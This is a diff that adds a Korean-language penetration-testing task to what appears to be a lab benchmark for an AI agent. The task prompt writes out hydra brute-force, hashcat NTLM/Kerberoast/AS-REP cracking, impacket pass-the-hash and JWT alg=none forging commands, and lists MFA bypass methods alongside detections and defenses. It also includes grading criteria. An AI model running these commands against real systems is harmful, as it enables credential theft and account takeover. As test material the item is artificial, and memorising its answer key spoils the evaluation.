@@ -1163,3 +1163,66 @@ steps:
   answer_detail: |
     HTB Box 작가 — KrbForest. 실 AD 환경 X — JuiceShop JWT + NTLM hash 시뮬. Author Notes 표준 양식.
   script: ''
+- order: 100
+  instruction: '[Multi-task] 인증 공격 5단계 통합 — 브루트포스 → NTLM/PtH → Kerberoasting → JWT alg=none → MFA 우회.'
+  bastion_prompt: |
+    인증 평가 5작업을 한 흐름의 침투로 수행해줘.
+
+    1) [브루트포스 + 스프레이] hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://{{WEB_IP}} 의 명령 +
+       비번 스프레이 (1 비밀번호 × N 사용자) 의 bash for loop 도 보여줘. 실제 호출은 안 하고 syntax + 예상 응답
+       (Account lockout / fail2ban / 정상 응답) 표를 만들어줘. MITRE T1110.001 + T1110.003 매핑.
+
+    2) [NTLM hash + PtH] echo -n 'Password123' | iconv -f ASCII -t UTF-16LE | openssl dgst -md4 로 NTLM hash
+       샘플을 생성하고, hashcat -m 1000 hash.txt rockyou.txt 의 크래킹 명령 syntax 를 보여줘. Pass-the-Hash
+       시뮬 (impacket-psexec -hashes :NTLMHASH user@target) 의 명령도 작성해줘. MITRE T1550.002 매핑.
+
+    3) [Kerberoasting] AD 환경 없이 개념 시뮬 — SPN 의 TGS-REQ 흐름 (klist → Add-Type / GetUserSPNs.py
+       의 의사코드) 작성 + 획득된 TGS hash 의 hashcat -m 13100 크래킹 명령. AS-REP Roasting (DONT_REQ_PREAUTH
+       플래그 의 hashcat -m 18200) 도 함께 명령으로 정리. MITRE T1558.003 + T1558.004 매핑.
+
+    4) [JWT alg=none] curl -s -X POST {{WEB_IP}}:3000/rest/user/login -d '{"email":"test@x","password":"y"}' 로
+       JWT 획득 시도 후, python3 -c 'import jwt,json; print(jwt.encode({"sub":"admin","exp":9999999999},
+       "",algorithm="none"))' 로 alg=none 토큰 의사 생성. JWT 3 segment 의 header.payload.signature 구조 +
+       header.alg=none 의 시그너처 0 byte 우회 원리도 markdown 으로 정리. MITRE T1606.001 매핑.
+
+    5) [MFA 우회 4 기법] Real-time Phishing (Evilginx2 의 reverse proxy) / SIM Swap / OAuth Token theft /
+       Session Hijack 의 4 우회 패턴 을 표로 정리하고, 각 의 detection 신호 + Wazuh 룰 ID 후보 + 방어 권고
+       (TOTP / WebAuthn / device-bound) 3가지를 markdown 으로 출력. MITRE T1621 매핑.
+
+    마지막에 5단계 × (인증 메커니즘 / 공격 기법 / MITRE TTP / 도구 / 방어 권고) 의 5×5 매트릭스 + 우선순위 정렬
+    1 페이지 보고서를 출력해줘.
+  hint: 인증 5단계는 실 AD 환경 없으면 syntax 시뮬 + 의사코드. JWT 만 실 호출 가능 (JuiceShop).
+  category: multi_task
+  points: 50
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: '[통합] 인증 공격 5단계 — Brute/NTLM/Kerberos/JWT/MFA. MITRE T1110/T1550/T1558/T1606/T1621 매핑 + 5×5 매트릭스.'
+      success_criteria:
+      - 5 단계 모두 실행
+      - MITRE T1110 또는 T1550 또는 T1558 또는 T1606 또는 T1621 중 3개 이상 매핑
+      - JWT alg=none syntax 정확 (3 segment header.payload.signature)
+      - Kerberoasting + AS-REP Roasting 의 hashcat mode (13100 / 18200) 명시
+      - MFA 우회 4 기법 정확
+      - 5×5 매트릭스 + 우선순위 보고서
+      acceptable_methods:
+      - bastion 의 multi-stage planning
+      - hydra / hashcat / impacket / curl / python jwt 의 표준 도구
+      - 의사코드 + dry-run (실 AD prod X)
+      - JuiceShop JWT 만 실 호출 가능
+      negative_signs:
+      - 3 단계 이하 만 수행
+      - JWT 구조 오류 (segment 2개 또는 4개)
+      - hashcat mode 누락
+      - MFA 우회 3 기법 이하
+      - 매트릭스 5×5 미만
+  target_vm: attacker
+  risk_level: low
+  answer: |
+    🤖 위 bastion_prompt 그대로. 인증 5단계 + 5×5 매트릭스.
+  answer_detail: |
+    Identity & Access PenTester 페르소나 — Kerberos/NTLM 의 실 AD 환경은 없으니 syntax 시뮬,
+    JWT alg=none 만 JuiceShop 으로 실제 호출 가능. 4 MFA 우회 의 detection + 방어 권고가 핵심 산출물.
+  script: ''
